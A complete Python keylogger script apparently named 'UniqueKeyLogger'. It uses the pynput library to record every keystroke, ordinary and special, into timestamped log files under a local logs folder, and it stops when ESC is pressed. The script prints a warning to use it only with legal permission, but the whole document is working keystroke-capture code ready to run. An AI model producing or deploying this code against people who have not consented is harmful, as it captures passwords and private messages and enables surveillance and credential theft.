import os
import logging
from datetime import datetime
from pynput import keyboard

# Ethical warning
print("** WARNING: Only use this program with explicit legal permission. **")

# Ensure logs directory exists
if not os.path.exists('logs'):
    os.makedirs('logs')

# Log file path
log_filename = datetime.now().strftime("logs/log_%Y%m%d_%H%M%S.txt")
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info('Key pressed: %s' % key.char)
    except AttributeError:
        logging.info('Special key pressed: %s' % key)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

print(f"Starting UniqueKeyLogger... Logs will be saved to {log_filename}\nPress ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogger stopped.")